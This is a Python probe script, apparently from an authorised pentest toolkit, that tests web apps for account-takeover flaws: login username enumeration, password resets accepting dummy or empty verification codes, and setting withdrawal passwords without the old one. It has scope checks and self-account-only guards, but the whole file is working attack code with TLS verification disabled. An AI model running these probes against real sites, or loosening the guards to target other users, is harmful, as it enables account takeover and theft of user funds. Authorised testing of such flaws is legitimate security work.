#!/usr/bin/env python3
"""任意验证码重置 + 无旧密设提现密（只打自己的号）。

通宝族：resetPassword 的 code 可空/任意；updateWithdrawPassword 不要旧密。
禁止对他人用户名发重置（L3 先问）。不打真实提现。

用法:
  python3 炼蛊房/ato_reset_withdraw_probe.py oracle \\
    --base https://授权站 --case <案> --exist-user SELF --ghost-user nosuchuser999
  python3 炼蛊房/ato_reset_withdraw_probe.py dummy-reset \\
    --base https://授权站 --case <案> --token "$T" --self-user SELF --new-password 'Xx1!'
  python3 炼蛊房/ato_reset_withdraw_probe.py withdraw-pwd \\
    --base https://授权站 --case <案> --token "$T" --new-password 'Ww1!'
"""
from __future__ import annotations

import argparse
import json
import re
import ssl
import sys
import urllib.error
import urllib.request
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-ato-reset-withdraw"
RESET_PATHS = (
    "/api/user/resetPassword",
    "/api/user/reset-password",
    "/api/password/reset",
    "/api/v1/user/forgot/verify",
)
WITHDRAW_PWD_PATHS = (
    "/api/user/updateWithdrawPassword",
    "/api/user/update-withdraw-password",
    "/api/wallet/setWithdrawPassword",
    "/api/withdraw/password",
)
LOGIN_PATHS = (
    "/api/user/login",
    "/api/auth/login",
    "/api/login",
    "/api/v1/user/login",
)
DUMMY_CODES = ("000000", "123456", "1", "test", "")



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if h in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(h):
        raise SystemExit(f"[scope] refuse out-of-scope host: {h}")


def _http(
    method: str,
    url: str,
    *,
    token: str = "",
    body: dict[str, Any] | None = None,
    timeout: float = 20.0,
) -> tuple[int, str]:
    headers = {"User-Agent": UA, "Accept": "application/json"}
    data = None
    if token:
        headers["Authorization"] = f"Bearer {token}"
        headers["token"] = token
    if body is not None:
        data = json.dumps(body, ensure_ascii=False).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method.upper())
    ctx = ssl._create_unverified_context()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return int(resp.status), resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return int(e.code), raw
    except Exception as exc:
        return 0, str(exc)[:200]


def _okish(status: int, text: str) -> bool:
    """只认明确成功码。短 200 / 含「验证码错误」不算 L2。"""
    if status not in (200, 201):
        return False
    low = (text or "").lower()
    if any(x in low for x in ("验证码错误", "验证失败", "invalid code", "code error",
                              '"success":false', '"success": false')):
        return False
    if re.search(r'"code"\s*:\s*(1|200)\b', low):
        return True
    return any(x in low for x in (
        '"msg":"ok"', '"msg": "ok"', '"success":true', '"success": true',
    ))


def cmd_oracle(args: argparse.Namespace) -> dict[str, Any]:
    base = args.base.rstrip("/")
    findings: list[dict[str, Any]] = []
    for path in LOGIN_PATHS:
        url = base + path
        a_st, a_tx = _http("POST", url, body={"userName": args.exist_user, "username": args.exist_user, "password": "DefinitelyWrongPwd9!"})
        b_st, b_tx = _http("POST", url, body={"userName": args.ghost_user, "username": args.ghost_user, "password": "DefinitelyWrongPwd9!"})
        if a_st == 0 and b_st == 0:
            continue
        diff = (a_st != b_st) or ((a_tx or "")[:180] != (b_tx or "")[:180])
        row = {
            "level": "L1" if diff else "none",
            "signal": "login-username-oracle" if diff else "login-no-diff",
            "path": path,
            "exist_status": a_st,
            "ghost_status": b_st,
            "exist_snip": (a_tx or "")[:160],
            "ghost_snip": (b_tx or "")[:160],
        }
        findings.append(row)
        print(f"  oracle {path} diff={diff} exist={a_st} ghost={b_st}")
        if diff:
            break
    return {"findings": findings}


def cmd_dummy_reset(args: argparse.Namespace) -> dict[str, Any]:
    if not args.self_user:
        raise SystemExit("[!] dummy-reset 只要 --self-user（自己的号）")
    if args.target_user and args.target_user != args.self_user:
        raise SystemExit("[!] 禁止对他人 resetPassword；L3 先问")
    if not args.new_password:
        raise SystemExit("[!] 需要 --new-password（只改自己的号）")
    base = args.base.rstrip("/")
    paths = (args.path,) if args.path else RESET_PATHS
    findings: list[dict[str, Any]] = []
    for path in paths:
        url = base + path
        for code in DUMMY_CODES:
            body = {
                "userName": args.self_user,
                "username": args.self_user,
                "account": args.self_user,
                "code": code,
                "newPassword": args.new_password,
                "password": args.new_password,
                "password2": args.new_password,
            }
            st, tx = _http("POST", url, token=args.token, body=body)
            hit = _okish(st, tx)
            row = {
                "level": "L2" if hit else "L1",
                "signal": "dummy-code-reset" if hit else "reset-alive",
                "path": path,
                "code": code if code else "(empty)",
                "status": st,
                "snip": (tx or "")[:200],
            }
            if st in (0, 404, 405):
                continue
            findings.append(row)
            print(f"  reset {path} code={row['code']} {st} hit={hit}")
            if hit:
                return {"findings": findings, "p1": True}
    return {"findings": findings, "p1": False}


def cmd_withdraw_pwd(args: argparse.Namespace) -> dict[str, Any]:
    if not args.token:
        raise SystemExit("[!] withdraw-pwd 需要 --token（自己的票）")
    if not args.new_password:
        raise SystemExit("[!] 需要 --new-password（只设自己的提现密，不打提现）")
    base = args.base.rstrip("/")
    paths = (args.path,) if args.path else WITHDRAW_PWD_PATHS
    findings: list[dict[str, Any]] = []
    for path in paths:
        url = base + path
        body = {"newPassword": args.new_password, "withdrawPassword": args.new_password}
        st, tx = _http("POST", url, token=args.token, body=body)
        if st in (0, 404, 405):
            continue
        hit = _okish(st, tx)
        findings.append({
            "level": "L2" if hit else "L1",
            "signal": "withdraw-pwd-no-old" if hit else "withdraw-pwd-alive",
            "path": path,
            "status": st,
            "snip": (tx or "")[:200],
            "note": "命中后提现仍先问；本探针不打 /withdraw",
        })
        print(f"  withdraw-pwd {path} {st} hit={hit}")
        if hit:
            break
    return {"findings": findings}


def main() -> int:
    ap = argparse.ArgumentParser(description="任意 code 重置 / 无旧密提现密（只打自己）")
    ap.add_argument("cmd", choices=("oracle", "dummy-reset", "withdraw-pwd"))
    ap.add_argument("--base", required=True)
    ap.add_argument("--case", default="")
    ap.add_argument("--token", default="")
    ap.add_argument("--self-user", default="")
    ap.add_argument("--target-user", default="", help="禁止填他人；仅允许等于 --self-user")
    ap.add_argument("--exist-user", default="")
    ap.add_argument("--ghost-user", default="nosuchuser999xyz")
    ap.add_argument("--new-password", default="")
    ap.add_argument("--path", default="")
    args = ap.parse_args()
    ensure_scope(args.base)
    if args.cmd == "oracle":
        if not args.exist_user:
            raise SystemExit("[!] oracle 需要 --exist-user（自己的用户名）")
        body = cmd_oracle(args)
    elif args.cmd == "dummy-reset":
        body = cmd_dummy_reset(args)
    else:
        body = cmd_withdraw_pwd(args)
    report = {
        "ts": _now(),
        "cmd": args.cmd,
        "target": args.base.rstrip("/"),
        **body,
        "playbook": "传承/夺舍·重置.md",
        "skill": "秦百胜·夺舍",
        "next": "L2 后填对象矩阵；真提现/改他人号先问。IDOR 阴勿结案。",
    }
    out = write_probe_json(
        report, case=args.case, case_subdir="ato_reset_withdraw", filename=f"{args.cmd}.json",
    ) if args.case else None
    print(json.dumps({"cmd": args.cmd, "findings": len(body.get("findings") or []), "out": str(out or "")}, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
